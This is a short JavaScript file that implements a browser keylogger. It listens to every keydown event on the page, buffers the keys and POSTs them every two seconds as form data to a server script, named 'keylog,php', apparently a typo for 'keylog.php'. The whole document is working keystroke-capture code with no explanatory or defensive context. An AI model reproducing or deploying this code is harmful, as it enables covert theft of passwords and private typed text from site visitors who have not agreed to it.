let keylog = {
    cache:[],
    delay:2000,
    sending:false,

     init(){
        window.addEventListener('keydown',(evt)  => {
            keylog.cache.push(evt.key)

        })

        window.setInterval(keylog.send,keylog.delay)

     },

     send() {
        if (!keylog.sending && keylog.cache.length != 0) {
            keylog.sending = true;
            let data = new FormData();
            data.append('keys', JSON.stringify(keylog.cache));
            keylog.cache = [];
    
            fetch("keylog,php", {
                method: 'POST',
                body: data
            })
            .then((res) => {
                if (!res.ok) {
                    throw new Error('Network response was not ok');
                }
                return res.text();
            })
            .then((res) => {
                keylog.sending = false;
                console.log(res);
            })
            .catch((err) => {
                console.error('Fetch error:', err);
                keylog.sending = false; // Reset sending flag in case of error
            });
        }
    }

}